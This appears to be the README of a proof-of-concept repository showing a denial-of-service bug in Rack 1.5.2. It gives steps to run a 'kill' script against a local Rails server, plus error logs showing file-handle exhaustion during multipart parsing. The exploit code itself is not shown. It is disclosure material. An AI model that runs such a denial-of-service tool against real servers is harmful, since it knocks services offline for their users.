rack_downer_poc
===============

The kill.rb script demonstrates the possible denial of service bug that exists in Rack.

To reproduce on rails:

0. to make your life easier, set your filehandle limit artificially low for this
1. ```cd railsapp```
2. ```bundle exec rails server```
3. ```./kill http://localhost:3000```
4. browse to http://localhost:3000

at step 3 you will see something like:

```
[2014-05-16 14:13:36] ERROR Errno::EMFILE: Too many open files - /var/folders/xy/1t835w8x53x25n_fj3601br80000gn/T/RackMultipart20140516-95323-e07spe
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/2.0.0/tempfile.rb:146:in `initialize'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/2.0.0/tempfile.rb:146:in `open'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/2.0.0/tempfile.rb:146:in `block in initialize'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/2.0.0/tmpdir.rb:142:in `create'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/2.0.0/tempfile.rb:136:in `initialize'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/rack-1.5.2/lib/rack/multipart/parser.rb:104:in `new'
 ```
 
 at step 4 you will see something like:
 
 ```
[2014-05-16 14:19:45] ERROR LoadError: cannot load such file -- action_controller/base
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/actionpack-4.0.5/lib/action_dispatch/middleware/static.rb:34:in `ext'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/actionpack-4.0.5/lib/action_dispatch/middleware/static.rb:18:in `match?'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/actionpack-4.0.5/lib/action_dispatch/middleware/static.rb:58:in `call'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/rack-1.5.2/lib/rack/sendfile.rb:112:in `call'
        /opt/boxen/rbenv/versions/2.0.0-p247/lib/ruby/gems/2.0.0/gems/railties-4.0.5/lib/rails/engine.rb:511:in `call'
```
